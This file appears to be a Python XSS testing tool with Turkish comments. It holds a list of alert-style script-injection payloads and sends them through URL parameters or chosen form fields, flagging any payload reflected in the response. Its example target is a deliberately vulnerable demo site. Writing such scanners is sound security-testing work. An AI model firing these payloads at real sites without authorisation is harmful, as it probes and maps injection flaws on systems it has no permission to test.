import requests
import re
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Ortak XSS payload listesi
payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "<svg/onload=alert(1)>", 
    "<iframe src='javascript:alert(1)'></iframe>",
    "<a href='javascript:alert(1)'>Click me</a>",
    "<body onload=alert(1)>",
    "<script>document.write('XSS')</script>",
    "<img src=1 onerror='alert(1)'>"
]

def test_reflected_xss(url):
    """Reflected XSS testi yapılır"""
    for payload in payloads:
        print(f"Testing payload: {payload}")
        full_url = url + payload
        try:
            response = requests.get(full_url, allow_redirects=True)  # Yönlendirmeleri takip et
            if response.status_code == 200 and payload in response.text:
                print(f"Payload successful: {payload}")
            else:
                print(f"Payload failed: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"Error during request: {e}")

def is_valid_url(url):
    """URL geçerliliğini kontrol etmek için bir fonksiyon"""
    regex = re.compile(
        r'^(?:http|ftp)s?://' 
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' 
        r'localhost|' 
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|' 
        r'\[?[A-F0-9]*:[A-F0-9:]+\]?)' 
        r'(?::\d+)?' 
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    
    return re.match(regex, url) is not None

def extract_form_details(url):
    """Bir sayfadaki tüm formları ve name değerlerini çıkarır."""
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    forms = soup.find_all("form")
    form_details = []

    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").lower()
        inputs = form.find_all("input")
        input_details = [{"name": input_tag.get("name"), "type": input_tag.get("type", "text")} for input_tag in inputs]
        form_details.append({
            "action": urljoin(url, action),
            "method": method,
            "inputs": input_details
        })

    return form_details

def test_form_xss(url, forms):
    """Formlara XSS payloadları gönderir."""
    for i, form in enumerate(forms, start=1):
        print(f"Form {i}: Action: {form['action']}, Method: {form['method']}")
        for idx, input_tag in enumerate(form['inputs'], start=1):
            print(f"  Input {idx}: Name: {input_tag['name']}, Type: {input_tag['type']}")

    form_choice = int(input("Select a form to test (e.g., 1, 2): ")) - 1
    input_choice = int(input("Select an input to test (e.g., 1, 2): ")) - 1

    selected_form = forms[form_choice]
    selected_input = selected_form['inputs'][input_choice]['name']

    # Formdaki diğer inputların 'value' bilgilerini alıp payloadları ekle
    data = {}
    for input_tag in selected_form['inputs']:
        input_name = input_tag['name']
        input_value = input_tag.get('value', '')  # Eğer 'value' varsa al, yoksa boş bir string kullan
        if input_name != selected_input:  # Test ettiğimiz input dışındaki tüm inputları aynı gönder
            data[input_name] = input_value

    # Payloadları tüm inputlara ekle
    for payload in payloads:
        data[selected_input] = payload
        print(f"Testing payload: {payload}")

        try:
            # Form methoduna göre request gönder
            if selected_form['method'] == 'post':
                response = requests.post(selected_form['action'], data=data)
            else:
                response = requests.get(selected_form['action'], params=data)

            # Yanıt kontrolü
            if response.status_code == 200 and payload in response.text:
                print(f"Payload successful: {payload}")
            else:
                print(f"Payload failed: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"Error during form request: {e}")


def start_xss():
    try:
        print("Welcome to the XSS Testing Tool")
        
        while True:
            print("\nSelect the type of XSS test to run:")
            print("1. Reflected XSS Test")
            print("0. Exit")
            choice = input("Enter the number of your choice: ")

            if choice == '1':
                print("\nRunning Reflected XSS Test...")

                while True:
                    url = input("Please enter the target URL (e.g. http://testphp.vulnweb.com/listproducts.php?cat=): ")
                    
                    if is_valid_url(url):
                        break
                    else:
                        print("Invalid URL format. Please enter a valid URL.")
                
                if "?" not in url:
                    print("No parameter found in the URL. Starting form analysis...")
                    forms = extract_form_details(url)

                    if forms:
                        print(f"Found {len(forms)} forms on the page.")
                        test_form_xss(url, forms)
                    else:
                        print("No forms found on the page.")
                else:
                    test_reflected_xss(url)                        
            
            elif choice == '0':
                print("Exiting the tool...")
                break
            else:
                print("Invalid choice, please select again.")
    
    except (KeyboardInterrupt, EOFError):
        print("\nExiting the tool...")
    except Exception as e:
        print(f"An error occurred: {e}")

